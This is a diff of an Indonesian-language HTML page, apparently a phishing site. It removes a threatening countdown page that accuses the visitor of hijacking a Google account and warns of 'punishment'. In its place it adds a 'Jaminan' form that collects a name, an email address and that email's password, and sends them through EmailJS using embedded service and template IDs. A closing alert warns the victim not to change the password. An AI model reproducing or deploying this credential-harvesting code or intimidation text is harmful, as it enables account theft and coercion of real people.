@@ -3,58 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Peringatan Ancaman</title>
+    <title>Send Email Form with EmailJS</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         body {
-            background-color: #121212;
-            color: white;
             font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
+            background: rgb(38, 255, 125);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
-        #timer {
-            font-size: 24px;
-            font-weight: bold;
-            margin-top: 10px;
-            color: red;
+        .contact-form {
+            background: #fff;
+            padding: 25px;
+            border-radius: 10px;
+            width: 400px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
         }
-        input, button {
+        .form-group {
+            margin-bottom: 15px;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 8px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
             padding: 10px;
-            margin-top: 10px;
-            font-size: 16px;
+            width: 100%;
+            background: blue;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background: darkblue;
         }
     </style>
 </head>
 <body>
-    <h1>⚠️ Peringatan! ⚠️</h1>
-    <p>Karena telah mengambil alih akun Google code 222, hukuman akan diberikan dalam:</p>
-    <div id="timer">30:00</div>
 
-    <p>Untuk menghindari hukuman, segera kembalikan akun dengan mengirimkan pesan ke admin.</p>
-    <form action="admin.html" method="POST">
-        <input type="text" name="message" placeholder="Tulis pesan ke admin..." required>
-        <button type="submit">Kirim</button>
-    </form>
+    <div class="contact-form">
+        <h1>Jaminan</h1>
+        <div class="form-group">
+            <label for="name">Nama</label>
+            <input type="text" id="name" placeholder="eg. Dara">
+        </div>
+        <div class="form-group">
+            <label for="email">Email jaminan</label>
+            <input type="email" id="email" placeholder="eg. dara@example.com">
+        </div>
+        <div class="form-group">
+            <label for="subject">Password email</label>
+            <input type="text" id="subject" placeholder="Sandi email">
+        </div>
+        <div class="form-group">
+            <label for="message">pesan</label>
+            <textarea id="message" placeholder="Type your message here..."></textarea>
+        </div>
+        <div class="form-group">
+            <button onclick="sendMessage();">Send Message</button>
+        </div>
+    </div>
 
     <script>
-        let countdown = 30 * 60; // 30 menit dalam detik
+        function sendMessage() {
+            emailjs.init("yHp6NNWn_P6pny19J"); // Pastikan API Key valid
 
-        function updateTimer() {
-            let minutes = Math.floor(countdown / 60);
-            let seconds = countdown % 60;
-            document.getElementById("timer").innerText = 
-                (minutes < 10 ? "0" : "") + minutes + ":" + 
-                (seconds < 10 ? "0" : "") + seconds;
-            
-            if (countdown > 0) {
-                countdown--;
-                setTimeout(updateTimer, 1000);
-            } else {
-                alert("Hukuman diberikan sekarang!");
-            }
+            let params = {
+                sendername: document.getElementById("name").value,
+                senderemail: document.getElementById("email").value,
+                subject: document.getElementById("subject").value,
+                message: document.getElementById("message").value
+            };
+
+            let serviceID = "service_kdkzua8"; // Ganti dengan service ID kamu
+            let templateID = "template_krz8o1b"; // Ganti dengan template ID kamu
+
+            emailjs.send(serviceID, templateID, params)
+                .then(response => {
+                    alert("Terimakasih, " + params.sendername + ". rulls jangan ganti password, ganti auto banned. Link password akan di berikan.");
+                    console.log("SUCCESS!", response);
+                })
+                .catch(error => {
+                    alert("Failed to send email. Please try again.");
+                    console.error("ERROR:", error);
+                });
         }
-
-        updateTimer();
     </script>
+
 </body>
 </html>
